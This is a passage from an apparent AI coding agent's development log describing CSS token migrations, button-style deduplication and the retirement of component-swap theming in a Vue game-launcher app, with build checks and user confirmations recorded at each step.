  the old `.strip-cover.centered` compound selector is gone entirely, not just superseded;
  confirmed all three old mismatched-fallback strings are gone from source, not just from the
  one line each was found on
- CSS bundle shrank again, 21.85kB → 20.92kB, consistent with real duplication removed
- Remaining from the original audit: Big Picture's whole cluster is now done; only the
  Category 2 unused-token findings (`--space-2`/`--space-3` gaps, `--space-5` padding,
  `--color-on-accent`) are still open

**Migrated the remaining Category 2 unused-token findings, closing out Milestone 18.** Gathered
exact locations for every pattern with `grep -rn` first, rather than fixing from memory of the
audit's summary. ~20 sites across the app:
- `1px` borders → `var(--button-border-width)`: the global `input`/`textarea`/`select` rule
  and `.list-row-shell` (both in `styles.css`), `SkeletonCard.vue`, `ConfirmInstall.vue`'s and
  `PluginSettings.vue`'s danger-callout borders, and two sites the original audit's
  `border: 1px solid` search pattern had missed entirely -
  `NavSidebar.vue`'s `border-right`/`border-top` (longhand properties, not `border` shorthand)
- `0.5rem`/`0.75rem` gaps → `var(--space-2)`/`var(--space-3)` across ~18 sites (`App.vue`,
  `AppSettings.vue`, `BaseModal.vue`, `GameFilters.vue`, `GameList.vue`,
  `InstallableStatus.vue`, `AddPlugin.vue`, `ConfirmInstall.vue`, `EditGame.vue` (including the
  `!important` variant), `PluginSettings.vue` ×5, `ToastContainer.vue`, `BigPictureTile.vue`,
  `AddGame.vue`, `SettingsButton.vue`, `NavSidebar.vue`) - plus a third, previously-unaudited
  site found only by re-`grep`-ing after the known ones were fixed: `GameListRow.vue`'s
  `.meta` rule, a second `gap: 0.75rem` in the same file the audit's line reference for that
  file hadn't captured
- `4px` radius → `var(--radius-sm)` (`NavSidebar.vue`'s `.nav-item`)
- `1.5rem` padding → `var(--space-5)` (`App.vue`'s `.content`, `BaseModal.vue`'s
  `.modal-frame`) - `App.vue`'s companion value, `2rem`, also matched a token exactly
  (`--space-6`), fixed alongside rather than leaving half the declaration hardcoded
- `color: white` → `var(--color-on-accent)` (`TitleBar.vue`'s close-button hover)
- **Deliberately excluded `brick-block-theme`'s own files** from all of the above, despite
  several of its files containing the exact same literal values (`gap: 0.5rem`,
  `border-radius: 4px`) that would otherwise have matched these patterns. Its hardcoded values
  are the built-in theme's own deliberate visual choices - same category as its intentionally
  thicker button/card borders (`2px`/`3px` vs. the app default `1px`) that this whole session
  has consistently treated as theme content, not bugs. A theme overriding the default look on
  purpose is not the same finding as a shared component that forgot to use an existing token
- Verified via exhaustive `grep -rn` across all of `src/` for every pattern, both before making
  changes (to catch sites the original audit missed) and after (to confirm zero literals
  remained anywhere, `brick-block-theme` correctly still showing its own untouched values) -
  not just trusting the original audit's file list as complete, the same lesson already
  learned twice this session (`BaseModal.vue`'s missed `8px`, the mismatched-fallback literals)
- `cargo check` clean (no Rust touched, checked anyway); `bun run build` clean; CSS bundle
  20.92kB → 21.34kB (grew slightly - expected, since replacing several short literals with
  longer `var(--name)` references isn't a duplication-removal step like the earlier migrations,
  it's a correctness one)

**Milestone 18 closed.** Audit → `:root`/primitive-styles relocation → all identified
duplicate-pattern migrations (desktop, then Big Picture's cluster) → the two radius-scale
decisions → this unused-token cleanup. Every step verified against real compiled output, not
assumed correct from the source diff alone - caught real bugs at nearly every stage
(`DataThemeManifest` silently dropping `cardVisual`, four separate mismatched fallback
literals, a scoped-CSS/foreign-component break, sites the original audit itself missed twice).

**Post-close cleanup: removed vestigial local classes left over from the migration.** User's
observation, stated precisely and correctly: scoped styles aren't inherited/reused across
components, so once a component's local class has had every property migrated out to a shared
`styles.css` class, keeping that local class name in the template serves no purpose at all -
it's not "scoped styling that still applies somewhere," it's just a dead label.
- Checked every shared-class template site individually (`grep -rn` for each of the 12 shared
  classes introduced this session) rather than assuming which ones were vestigial - most still
  have real local content and correctly keep both classes (`.thumb`/`.thumb-placeholder`,
  `.filter-tag`, `.tag`, `.empty` ×3, `.big-picture`/`.slideshow`, `.backdrop-overlay`,
  `.strip-cover`/`.strip-cover-dummy`, `.tile`, `.tile-cover-placeholder`/
  `.strip-cover-placeholder` all still carry genuinely-extra properties)
- Found 4 truly empty ones: `GameListRow.vue`'s `.row`, `SkeletonRow.vue`'s `.skeleton-row`,
  and `BigPictureGrid.vue`/`BigPictureSlideshow.vue`'s `.backdrop` - each had already been
  reduced to a comment-only rule with zero actual properties during the earlier migrations.
  Removed the class name from the template and the now-pointless comment from the `<style
  scoped>` block; updated `styles.css`'s own header comments for `.list-row-shell`/
  `.bp-backdrop` to stop referencing class names that no longer exist anywhere
- **Found a second, related case while checking**: `focused`/`centered` on the base
  `BigPictureTile.vue`/`BigPictureSlideshow.vue` are conditionally-bound state classes, not
  permanent base classes, but the same principle applied - once `.tile.focused`/
  `.strip-cover.centered` were replaced by `.tile.bp-cover-focused`/the shared
  `.bp-cover-focused` earlier this session, nothing in CSS targeted bare `.focused`/`.centered`
  anymore either. Confirmed via `grep` that no CSS rule and no JS (`classList`/`querySelector`)
  referenced them before removing - `brick-block-theme`'s own separate `.brick-tile.focused`
  rule is a different component's own scoped style, unrelated and untouched
- Verified via compiled CSS same as every other step: old vestigial selectors produce zero
  output now, the shared classes they were riding alongside still compile with the same
  properties as before - this was a pure cleanup, no behavior change, confirmed rather than
  assumed
- `bun run build`/`cargo check` both clean; CSS bundle size unchanged (21.34kB) - expected,
  since no actual style rules were removed, just dead template references and a few comments

**Converted `.hint` to a real primitive element (`<small>`), on user's further proposal.** The
insight: since scoped styles can't be reused across components anyway, a class name repeated
identically across many files gets nothing extra from staying a class if HTML already has the
semantically-correct primitive for it - a global tag-selector rule (same mechanism `button`/
`input`/`textarea`/`select` already use) works everywhere with zero class needed at all.
- `grep`'d for `.hint` across the whole tree first rather than assuming which files had it -
  5 real sites: `CandidatePicker.vue`, `ConfirmInstall.vue` (×2), `EditGame.vue`,
  `PluginSettings.vue` (×2), mixed between `<p>` and `<span>` tags inconsistently despite being
  the same semantic thing (secondary/muted helper text) everywhere
  - Checked each site's actual rule content too, not just that the class name matched - found
    they weren't quite identical: `CandidatePicker.vue`/`PluginSettings.vue` used
    `font-size: 0.8rem; opacity: 0.7`, `ConfirmInstall.vue`/`EditGame.vue` used
    `font-size: 0.75rem; opacity: 0.8` - a real fork needing a human call, same as the earlier
    `8px` radius decision, not something to silently average or pick. User chose the
    `0.8rem`/`0.7` pairing (as an actual paired combination that already existed somewhere, not
    a new mix of the two files' separate values)
- **Verified the inline-vs-block difference wouldn't visually break anything before
  converting**, rather than assuming `<small>` (inline by default) is a drop-in replacement for
  `<p>` (block) - checked each site's actual parent container:
  - `BaseModal.vue`'s `.modal-body` and `EditGame.vue`'s `label` are both `display:flex;
    flex-direction:column` - flex always blockifies its children for layout purposes
    regardless of their own specified `display`, so `CandidatePicker.vue`/`ConfirmInstall.vue`/
    `EditGame.vue`'s conversions are safe with no override needed
  - `PluginSettings.vue`'s `.tab-panel` is a plain, non-flex `<div>` - a lone inline element
    there would size to its content instead of filling the container width the way the
    original `<p>` did, wrapping text at a different, narrower point. Added an explicit local
    `small { display: block; }` override for just those two sites to guarantee equivalent
    layout, rather than letting a real (if subtle) visual regression slip through
- New global `small { font-size: 0.8rem; opacity: 0.7; }` in `styles.css`, alongside the
  existing `button`/`input` primitive-element rules. Per-component overrides only where
  genuinely needed: `CandidatePicker.vue` keeps its own `margin`, `PluginSettings.vue` keeps
  `display: block` + `margin`; `ConfirmInstall.vue`/`EditGame.vue` need nothing extra at all,
  fully covered by the shared primitive
- Verified via compiled CSS: global `small{font-size:.8rem;opacity:.7}` present once, the two
  per-component `small[data-v-*]` overrides contain exactly the expected extra properties,
  zero `.hint` selector left anywhere. `bun run build`/`cargo check` both clean
- **Found a related but different finding while doing this**: `.error` (byte-identical between
  `AddGame.vue`/`EditGame.vue`, just `color: var(--color-danger)`) is a plain shared-class
  duplicate, not a primitive-element match - there's no HTML tag that means "error message" the
  way `<small>` means "secondary text." Left open, not bundled into this pass since it's a
  genuinely different kind of finding from what was actually asked

**Migrated `.error` too.** No design decision needed here, unlike `.hint` - byte-identical in
both files. New `.error-text` in `styles.css`, both components' local `.error` rules replaced
with a comment pointing at it. Verified via compiled CSS: `.error-text{color:var(--color-
danger)}` present once, zero leftover `.error[data-v-*]` rules anywhere. `bun run build` clean.

**Button-styling consistency pass across components, on user's request.** Delegated to an
Explore agent to audit every `<style scoped>` button rule in the tree, expecting the same kind
of duplication findings as the rest of Milestone 18's follow-ups. The audit came back with
something sharper: two of its findings weren't merely duplicated CSS, they were two components
rendering the *same visual concept* with *actually divergent* results - real bugs, not just
unmigrated repetition. Asked the user via `AskUserQuestion` whether to fix the two real bugs
first or take the full list in file order; user chose fixing the bugs first, deferring the
remaining duplication/design-decision findings.

- **Bug 1: `.view-toggle-button` size mismatch.** `App.vue`'s Big Picture grid/slideshow toggle
  and `GameFilters.vue`'s grid/list toggle both used the literal class name
  `.view-toggle-button` - but only `GameFilters.vue`'s version had ever gotten the real
  square-icon treatment (`width: 2.2rem`, `padding: 0`, centered flex). `App.vue`'s local rule
  was a wider, padded button that just happened to reuse the same name, left over from before
  either was migrated. Sharing a class name across two `<style scoped>` blocks does nothing -
  scoped CSS only ever matches the component that compiled it - so this had silently been two
  different-looking buttons the whole time, not a real shared style. Promoted
  `GameFilters.vue`'s version (the correct, complete one) into `styles.css` as the single
  `.view-toggle-button` rule; removed both local scoped rules, replacing each with a comment
  pointing at the shared definition.
- **Bug 2: `GameCard.vue`/`GameListRow.vue` icon-action row inconsistency.** Both components
  render the identical 4-button set (play/fetch-metadata/edit/remove, same handlers, same
  icons) - `GameCard.vue`'s `.footer` had a tighter icon-button treatment
  (`flex: 1; min-width: 0; padding: 0.35rem 0`) that `GameListRow.vue`'s `.actions` never
  received, leaving its buttons at the global default padding - a visible size/spacing mismatch
  between two renderings of the same actual button row. Added `.icon-action-row button` to
  `styles.css`; applied `icon-action-row` as a second class on both `GameCard.vue`'s `.footer`
  div and `GameListRow.vue`'s `.actions` div (not on each button individually, since both
  already used a `button` descendant selector). `GameCard.vue`'s own local `.footer button` rule
  removed entirely (nothing extra remained); `GameListRow.vue` never had one to remove, so just
  gained the shared behavior it had been missing.
- Verified via compiled CSS (`dist/assets/index-B97rkwHp.css`, 21.05kB) after `bun run build`:
  `.view-toggle-button{display:flex;align-items:center;justify-content:center;width:2.2rem;
  flex-shrink:0;padding:0}` present exactly once, zero old scoped `.view-toggle-button`
  leftovers; `.icon-action-row button{flex:1;min-width:0;padding:.35rem 0}` present exactly
  once, zero old `.footer button` leftovers. `cargo check` run as formality (no Rust touched)
  - clean.
- Remaining audit findings deliberately left open, pending further direction: a clean exact
  duplicate (`AddPlugin.vue`'s `.registry-list button`/`PluginSettings.vue`'s
  `.permission-needed button`, `font-size: 0.75rem; padding: 0.2rem 0.6rem`, no decision
  needed); a small/compact button font-size fork across `0.75rem`/`0.8rem`/`0.85rem` needing a
  real design call (one tier vs. a genuine two-tier system, same category of decision as the
  earlier `8px` radius and `.hint` font-size forks); `TitleBar.vue`'s chromeless window buttons
  (likely a different genre, left alone by default); a repeated `.active` accent-swap idiom
  across `.nav-item.active`/`.filter-tag.active`/`.tabs button.active` (lower priority, possible
  future shared class). Also flagged separately by the audit, not yet scoped: a `--space-*`
  tokenization pass for hardcoded values off the spacing scale (`0.25rem`/`0.35rem`/`0.4rem`/
  `2.2rem`/`46px`).

**Migrated the audit's clean exact duplicate.** `AddPlugin.vue`'s `.registry-list button`
(the per-entry "Install" button in the curated-registry list) and `PluginSettings.vue`'s
`.permission-needed button` (the "Grant" button on the run-programs permission prompt, appearing
at 2 sites - source and wrapper plugin tabs both render the same permission-check markup) were
byte-identical: `font-size: 0.75rem; padding: 0.2rem 0.6rem`. No design decision needed here,
unlike the two bugs fixed earlier in this pass - straightforward migration.
- New `.compact-button` in `styles.css`. Applied directly on each `<button>` element rather
  than via a container descendant selector (unlike `.icon-action-row button`) - these aren't a
  uniform row of several buttons sharing one parent, just individual buttons in otherwise
  differently-shaped contexts (a `<li>` in a list, a `<p>` permission banner).
  - Attempted the two `PluginSettings.vue` "Grant" button edits (both byte-identical lines) via
    a PowerShell `Get-Content`/indexed-assignment/`Set-Content -NoNewline` script rather than
    the Edit tool, since the two lines aren't independently unique. This collapsed the entire
    file to a single line (`-NoNewline` interacting badly with an array of strings passed to
    `Set-Content`) - caught immediately by re-reading the file, restored via
    `git checkout -- <file>` before any further changes, then redone correctly with the Edit
    tool's `replace_all: true` instead, safe here since both target lines are meant to receive
    the exact same edit.
- Removed both local scoped rules (`AddPlugin.vue`'s `.registry-list button`,
  `PluginSettings.vue`'s `.permission-needed button`), replacing each with a comment pointing at
  `.compact-button`.
- Verified via compiled CSS: `.compact-button{font-size:.75rem;padding:.2rem .6rem}` present
  exactly once, zero leftover `.registry-list button`/`.permission-needed button` selectors.
  `bun run build` clean (20.95kB); `cargo check` clean (no Rust touched, checked anyway).

**Resolved the small/compact-button font-size fork, the audit's remaining design-decision
finding.** Grepped every `font-size: 0.75rem|0.8rem|0.85rem` site across `.vue` files first to
find the real button-specific instances (not every font-size hit - most were unrelated text
sizing), then narrowed to actual `button`-selector rules: `.compact-button` (0.75rem, just
migrated above), `PluginSettings.vue`'s `.reorder-buttons button` (0.75rem, the up/down arrow
buttons) and `.uninstall-theme` (0.75rem, the data-theme "Remove" button), `EditGame.vue`'s
`.input-with-button button` (0.8rem, a small button beside a text input) and `.tag-remove`
(0.8rem, a borderless tag "x" button), and `PluginSettings.vue`'s `.scan-button`/
`.add-plugin-button` (0.85rem). Presented the actual fork to the user via `AskUserQuestion`
(collapse to one 0.75rem tier / keep a genuine two-tier 0.75rem-vs-0.8rem system / leave as-is)
rather than picking a resolution unilaterally, same discipline as the earlier `8px` radius and
`.hint` font-size forks. User chose collapsing to one tier, 0.75rem.
- Turned out `.reorder-buttons button`/`.uninstall-theme` were already `0.75rem` - only
  `EditGame.vue`'s two 0.8rem sites actually needed changing, a smaller diff than the fork
  initially suggested.
- **Found the `.scan-button`/`.add-plugin-button` 0.85rem declarations were pure redundancy
  while investigating**, not a real third tier at all: `0.85rem` is literally the global
  `button` element's own default font-size in `styles.css` (line 81), so these two explicit
  overrides did nothing - removed both. `.add-plugin-button` then had zero properties left in
  its `<style scoped>` block, so removed the now-vestigial class from its template too (the
  `<button>` in `PluginSettings.vue`'s header), following the same "scoped styles aren't reused,
  a class with no rule targeting it is dead" reasoning from the earlier vestigial-class cleanup
  pass, not just this pass's own convention.
- Verified via compiled CSS: `input-with-button button[data-v-*]{font-size:.75rem}` and
  `.tag-remove[data-v-*]{...font-size:.75rem...}` both present with the new value;
  `.scan-button[data-v-*]{margin-top:.5rem}` keeps only its real property; zero
  `add-plugin-button` string anywhere in the compiled output. `bun run build`/`cargo check`
  both clean; CSS bundle shrank slightly, 20.95kB → 20.88kB (expected - two rules got smaller,
  one disappeared entirely).

**Migrated the last remaining audit finding: the repeated `.active` accent-swap idiom.**
`NavSidebar.vue`'s `.nav-item.active`, `GameFilters.vue`'s `.filter-tag.active`, and
`PluginSettings.vue`'s `.tabs button.active` were byte-identical
(`background: var(--color-accent); color: var(--color-on-accent)`) - a genuine 3-way exact
duplicate, same category as the `.compact-button`/`.registry-list button` finding earlier in
this pass, not a design decision like the font-size fork.
- New `.accent-active` in `styles.css`.
- Checked each site's `active` class binding for any other purpose before touching it - in all
  three files, `active`/`.active` existed *solely* to trigger this one now-shared rule (grepped
  each file for every other `active` occurrence: component state variables like `activeTab`/
  `activeView` don't count, and none of the three had a second CSS rule or JS `classList`/
  `querySelector` reference to the bare class). Since nothing else depended on the `active`
  class name itself, replaced each `:class="{ active: cond }"` binding directly with
  `:class="{ 'accent-active': cond }"` rather than binding both classes side by side - there
  was nothing left for a separate local `active` class to still mean.
  - `PluginSettings.vue` had 5 tab buttons on this exact pattern (`source`/`theme`/`metadata`/
    `controller`/`wrapper`); reformatted the 3 longer tab names' now-longer `:class`/`@click`
    attribute pairs onto their own lines to stay under a reasonable line width, matching the
    file's existing multi-line button formatting elsewhere.
- Removed all three local scoped `.active` rules, replacing each with a comment pointing at
  `.accent-active`.
- Verified via compiled CSS: `.accent-active{background:var(--color-accent);color:var(--color-
  on-accent)}` present exactly once; zero `nav-item.active`/`filter-tag.active`/
  `tabs button.active` strings anywhere in the compiled output. `bun run build`/`cargo check`
  both clean; CSS bundle shrank again, 20.88kB → 20.67kB.

**Button-consistency follow-up fully closed.** Every finding from the delegated audit has now
been resolved or explicitly deferred: the two real bugs (`.view-toggle-button`,
`.icon-action-row`), the clean exact duplicate (`.compact-button`), the font-size fork
(collapsed to one 0.75rem tier), and the `.active` idiom (`.accent-active`) are all done.
`TitleBar.vue`'s chromeless window buttons were left alone throughout - a genuinely different
genre of button (no border, transparent background, fixed 46px square), not a variant of any of
the shared classes introduced this pass. The `--space-*` tokenization pass the audit flagged
separately (hardcoded `0.25rem`/`0.35rem`/`0.4rem`/`2.2rem`/`46px` values off the spacing scale)
remains open and unscoped - a distinct piece of follow-up work, not bundled into this pass.

## Milestone 19 — Retire Component-Swap Theming (scoped, not started)

**Groundwork: matched `brick-block-data-theme`'s button frame to its card frame, on user
request ("try copying GameCards' frame style to buttons in brick block theme").** First applied
to the *built-in* `brick-block-theme` plugin's own `.footer button` rule (bumped its border from
an approximate `2px` to the card frame's real `3px`, both using `var(--color-surface1,
#7c2c00)`) - a same-component scoped-CSS tweak, no new capability needed there. User then
clarified the actual target was the *detached data-theme* (`brick-block-data-theme`), which has
no scoped CSS of its own at all - its real app buttons render through the global `button`
primitive in `styles.css`, using whatever `cssVariables` it declares.
- Root cause: the global `button` rule's `border-radius: var(--radius-md)` had no opt-in
  override (unlike `--card-radius`/`--balloon-radius`), and its border color was hardcoded to
  `--color-surface0` with no way for a theme to point it at a different token - the color the
  card frame actually uses (`--color-surface1`) in this theme's palette.
- Added two new opt-in hooks to `styles.css`'s global `button` rule, same pattern as every other
  per-element hook in this project: `--button-radius` (falls back to `--radius-md`),
  `--button-border-color` (falls back to `--color-surface0`).
- `brick-block-data-theme`'s manifest set both - `--button-radius: 0`, `--button-border-color:
  #7c2c00` - alongside bumping `--button-border-width` from `2px` to `3px` to match the card
  frame's real width (the manifest had shipped with only an approximation).
- Version bumped in three small, independently-verified steps rather than one batched change:
  1.2.0 → 1.2.1 (`--button-border-width` fix) → 1.2.2 (`--button-radius`) → 1.2.3
  (`--button-border-color`) - each copied into the app's cached
  `data-themes/brick-block-data-theme/theme.json` and confirmed before moving to the next.
- `bun run build` clean after each `styles.css` addition; no Rust touched.

**Reviewed `src/theme/` for what's load-bearing, on user's request.** All four files
(`cardVisualAst.ts`, `cardVisualRegistry.ts`, `fontFaceRegistry.ts`, `slotRegistry.ts`) are
genuinely wired in - not dead, not redundant with each other - but serve two structurally
different theme mechanisms: `slotRegistry.ts` is the whole-component-swap path
(`GameGrid.vue`/`BigPictureGrid.vue`'s `useThemeSlot`, `stores/theme.ts`'s
`setActiveSlots`/`clearActiveSlots`), while the AST/registry/font-face trio is the data-only
declarative path a JSON manifest can actually use.

Follow-up question surfaced the real finding: **`slotRegistry.ts` has exactly one live
consumer.** Grepped every `ThemePlugin` for a `slots` field - only the built-in
`brick-block-theme` sets one. If that plugin were removed today, `slotRegistry.ts` and its call
sites wouldn't error, they'd just go permanently inert (`activeSlots` never populated by
anything, `useThemeSlot` always resolving to its fallback) - dead weight with nothing left to
reactivate it, since a JSON data-theme manifest structurally can't ship a real Vue component the
way `slots` requires.

**Decided to retire component-swap theming entirely rather than leave it stranded.** Weighed the
tradeoff directly: JSON-AST/tokens are strictly safer for untrusted third-party themes (no code
execution, validated schema - see Milestone 17's sandbox-escape findings for why that matters)
but bounded by whatever node types/hooks the core app has built; component-swap has no such
ceiling but requires either build-time bundling (today's built-in-only limitation) or a much
larger trust boundary for real third-party distribution. Given the project already committed to
signed/sandboxed WASM distribution for source plugins, and this session's own hook additions
(card frame, balloon, cover placeholder, and now button frame/radius/border-color) have closed
nearly all of Brick Block's *desktop*-card visual gap already, kept component-swap only made
sense as a temporary bridge, not a permanent second theming mechanism.

**Scoped Milestone 19 around the one real blocker: Big Picture.** `BigPictureTile.vue` never
got the AST-override treatment `GameCard.vue` did - flagged as a forward-looking risk back in
Milestone 18's audit, now the concrete reason this can't just be deleted today.
`BrickBlockBigPictureTile.vue`'s look (4px pixel border, diagonal-stripe placeholder, pixel
font) has no data-theme equivalent path, and its frame/placeholder colors (`#111`/`#444`) are
hardcoded literals, not tokenized like `GameCard.vue`'s already are. Scoped the milestone to
close that gap first, prove full parity between the built-in and data-theme versions, and only
then actually delete the built-in plugin and the now-fully-dead `slotRegistry.ts`/
`ThemeSlotName` - deliberately not deleting anything before parity is verified, since that would
silently regress Big Picture's Brick Block appearance for anyone still on the built-in version.

**Gave `BigPictureTile.vue` a `cardVisual`-AST render path, closing the milestone's first real
gap.** Wired in exactly the same pattern `GameCard.vue` already uses: `CardVisualRenderer`/
`useActiveCardVisual` from the existing `theme/cardVisualAst.ts`/`cardVisualRegistry.ts` -
deliberately the *same* shared `activeCardVisual` ref, not a second one, since a theme's
`cardVisual` field describes one cover-art rendering concept, reusable wherever a game's cover
needs rendering.
- Found a real structural mismatch before wiring it in: `GameCard.vue`'s `.card-visual` wrapper
  has `overflow: hidden` + its own radius, so the AST's `.cover`/`.cover-placeholder` output
  (styled by a global, unscoped rule in `GameCard.vue` with no radius of its own by design) gets
  clipped correctly by the wrapper. `BigPictureTile.vue`'s `.bp-cover-frame` had no
  `overflow: hidden` - its own `.tile-cover`/`.tile-cover-placeholder` rounded themselves
  individually instead. Without fixing this first, an active theme's AST output would have
  rendered with square corners in Big Picture while working correctly on the desktop grid.
  Added `overflow: hidden` to the shared `.bp-cover-frame` rule (also benefits
  `BigPictureSlideshow.vue`'s `.strip-cover`, which shares the same class) - verified via
  compiled CSS.
- Confirmed no further sizing work was needed: the AST's `.cover`/`.cover-placeholder` classes'
  global `width: 100%; aspect-ratio: 3/4; object-fit: cover` values already exactly matched
  `.tile-cover`/`.tile-cover-placeholder`'s own values - not a coincidence, both were already
  aligned during Milestone 18's tokenization pass.
- `bun run build` (typecheck + build) clean; `cargo check` clean (no Rust touched).

**Tokenized `BigPictureTile.vue`'s frame/title, the milestone's second checklist item.**
Re-compared `BrickBlockBigPictureTile.vue`'s `.brick-frame` against the default
`.bp-cover-frame` and found the AST path alone doesn't close the whole gap: Brick Block's tile
has a *permanent* 4px border + diagonal-stripe background, visible even unfocused, while
`.bp-cover-frame` is `border: 3px solid transparent` until a separate `.bp-cover-focused` state
class swaps it to the accent color - there was no opt-in hook for a theme to give the frame a
permanent look the way `GameCard.vue`'s `--card-border-width`/`--card-radius` already let it.
Brick Block's tile title also uses a pixel font + a black drop-shadow for readability, with
nothing on `.tile-title` to hook into either.
- Added `--tile-background`/`--tile-border-width`/`--tile-border-color` to the shared
  `.bp-cover-frame` rule (all undeclared by default - `none`/`3px`/`transparent`, matching
  today's exact look with zero hooks set) and `--tile-title-font-family`/
  `--tile-title-text-shadow` to `BigPictureTile.vue`'s own local `.tile-title` rule (same
  reasoning as `--balloon-font-family`).
- `.bp-cover-focused`'s existing `border-color: var(--color-accent)` still wins on focus
  regardless of what a theme sets `--tile-border-color` to, matching
  `.brick-tile.focused .brick-frame`'s own behavior exactly (focus always shows the accent
  ring, no exception).
- Verified via compiled CSS: `.bp-cover-frame{background:var(--tile-background, none);
  border:var(--tile-border-width, 3px) solid var(--tile-border-color, transparent);...}` and
  `.tile-title[data-v-*]{...font-family:var(--tile-title-font-family, inherit);
  text-shadow:var(--tile-title-text-shadow, none)}` both present with the expected fallbacks.
  `bun run build`/`cargo check` both clean.
- Not yet done: actually setting these new hooks in `brick-block-data-theme`'s manifest to
  reproduce Brick Block's Big Picture look for real (next checklist item) - this pass only
  built the capability and verified it compiles with safe no-op defaults.

**Ported Brick Block's Big Picture tile look to `brick-block-data-theme`'s manifest
(`data-theme-plugins` repo).** No new AST work needed here at all - the manifest's existing
`cardVisual` field (the `if`/`image`/`else`-`★` shape, already written for the desktop card back
in Milestone 17) is the same shared registry `BigPictureTile.vue` now reads too, so the star
glyph and cover-art swap already worked correctly the moment the AST render path landed. This
pass only needed the new `--tile-*` hooks set in `cssVariables`:
- `--tile-background`: the same diagonal-stripe `repeating-linear-gradient` pattern as
  `--cover-placeholder-background`, at the built-in `BrickBlockBigPictureTile.vue`'s actual
  stripe width (`12px`/`14px` stops, not the card's `10px`/`12px` - the two were never identical
  even in the original built-in component, kept that intentional difference rather than
  unifying it).
- `--tile-border-width: 4px`, matching `.brick-frame`'s real width (thicker than the card
  frame's `3px` - again an intentional built-in difference, not a bug to fix).
- `--tile-border-color: var(--color-surface1)` - referenced the existing token rather than
  repeating its literal hex, same pattern already used by `--balloon-background`.
- `--tile-title-font-family`/`--tile-title-text-shadow`: identical values to
  `--balloon-font-family` (the same pixel font) and the built-in title's `2px 2px 0 #000`
  drop-shadow.
- Version bumped `1.2.3` → `1.3.0` (minor - new capability usage via new `cssVariables` keys,
  backward compatible since an older app build simply ignores unknown custom properties rather
  than breaking). Copied into the app's cached `data-themes/brick-block-data-theme/theme.json`
  and verified live, same discipline as every other manifest change this session - not just
  assumed correct from the diff.

**Verified full parity between the built-in `brick-block-theme` and the data-theme version,
property by property rather than eyeballing it.** Read every visual rule in
`BrickBlockGameCard.vue`/`BrickBlockBigPictureTile.vue` side-by-side against
`brick-block-data-theme`'s `cssVariables`, matching each one to whichever opt-in hook (or lack
of one) governs it on the host app side. Found two more real gaps this way, both closed with
new hooks following the exact same pattern as everything else this milestone:
- **Tile corner radius** - built-in `.brick-frame` uses `4px`; the shared `.bp-cover-frame` had
  its `border-radius` hardcoded to `var(--radius-xl, 10px)` with no override at all (unlike
  `--card-radius` on the desktop side, which *does* have one). Added `--tile-radius` (falls back
  to the existing default), set to `4px` in the manifest.
- **Focus-ring style** - built-in's `.brick-tile.focused .brick-frame` shows a solid
  `0 0 0 4px var(--color-accent)` ring; the shared `.bp-cover-focused` uses `box-shadow:
  var(--shadow-lg)` (a soft, generic elevation shadow) with no override. Added
  `--tile-focus-shadow` (falls back to `var(--shadow-lg)`), set to
  `0 0 0 4px var(--color-accent)` in the manifest - reusing the theme's own accent token rather
  than a literal hex, consistent with `--balloon-background`/`--tile-border-color`'s existing
  `var(--color-accent)`-style references.
- Verified via compiled CSS: `.bp-cover-frame{...border-radius:var(--tile-radius, var(--radius-
  xl, 10px))...}` and `.bp-cover-focused{border-color:var(--color-accent);box-shadow:var(--tile-
  focus-shadow, var(--shadow-lg))}` both present with the expected fallback chain. `bun run
  build`/`cargo check` both clean. Manifest bumped `1.3.0` → `1.3.1`, copied into the app's
  cached theme.json, verified live.
- Two more gaps found but deliberately left open, not real blockers: the built-in balloon's
  title/playtime type sizes (`0.85rem`/`1.4` line-height, `0.75rem`) have no override hooks at
  all (the base `GameCard.vue` balloon's own `.balloon-title`/`.balloon-playtime` font-size
  rules were never tokenized, pre-dating this milestone entirely), and the built-in swap
  deliberately renders the cover-placeholder star *larger* in Big Picture (`4rem`) than on the
  desktop card (`2.5rem`) - since both contexts share one `cardVisual` AST and one set of
  `--cover-placeholder-*` hooks by design, the data-theme version necessarily renders the same
  size in both places. Closing either would mean doubling several hooks into desktop/tile-
  specific variants purely for a cosmetic-only difference - not worth the added surface for what
  it buys.

**Deleted the built-in `brick-block-theme` plugin and the now-fully-dead `slotRegistry.ts`,
closing the milestone.** Confirmed via `AskUserQuestion` before doing it, since this removes a
shipped built-in theme option (users would need to install `brick-block-data-theme` separately
to get it back) - a real user-facing behavior change, not just an internal refactor, even though
parity had just been verified.
- `rm -rf src/plugins/brick-block-theme/` - the whole folder (both Vue components, the font
  asset, `plugin.json`, `index.ts`).
- `src/theme/slotRegistry.ts` deleted outright - grepped every `ThemePlugin` first (back when
  scoping this milestone) and confirmed it had exactly one consumer; that consumer is now gone.
- `ThemeSlotName` type and the `slots?` field removed from `ThemePlugin` (`plugins/types.ts`).
- `stores/theme.ts`: removed the `setActiveSlots`/`clearActiveSlots` import and both call sites
  (`setActiveTheme`'s reset path and its plugin-activation path) - `cardVisual`/`fontFaces`/
  `cssVariables` handling untouched, they never depended on slots.
- `GameGrid.vue`/`BigPictureGrid.vue`: removed `useThemeSlot` entirely, rendering `GameCard`/
  `BigPictureTile` directly (`<GameCard v-for=... />`/`<BigPictureTile v-for=... />`) instead of
  through a `<component :is="...">` indirection that only ever resolved to the same fallback now
  anyway.
- Verified via `grep -rn "brick-block-theme|slotRegistry|ThemeSlotName|useThemeSlot|setActiveSlots|clearActiveSlots"`
  across all of `src/` - zero remaining hits (the one incidental match, `BigPictureSlideshow.vue`'s
  local `const slots: CoverSlot[]`, is an unrelated local variable name, not this mechanism).
  `bun run build` (typecheck + build) and `cargo check` both clean; JS/CSS bundle shrank as
  expected (one fewer CSS chunk - the built-in plugin's own bundled `@font-face` asset is gone).

**Milestone 19 fully closed.** `cardVisual` AST + CSS-variable opt-in hooks is now the only
theming mechanism in the app, for both desktop and Big Picture, for every theme kind (built-in
default, data-only, and any future third-party one) - `slots`/component-swap theming, which only
ever had one real consumer, no longer exists at all.

**Documentation tidy pass, on user request.** `milestones.md`'s Milestone 14.5/19 sections had
drifted back into devlog-style multi-line narrative (the pinned-filter-bar saga especially,
several paragraphs per bullet) - condensed both back to one-line-per-item, matching the
convention already applied to Milestones 17/18 earlier. Also delegated a codebase-wide sweep
(via Explore) for in-code comments narrating past events/decisions rather than documenting a
present-tense invariant - found real candidates in `App.vue`, `GameFilters.vue`,
`GameListRow.vue`, `stores/wrapperPlugins.ts`, `db.rs`, `plugin_installer.rs`, and
`wasm_plugins.rs`. Trimmed each to keep only the load-bearing invariant (why a value must stay
what it is, what would break if changed), dropping the "was"/"previously"/"this was skipped
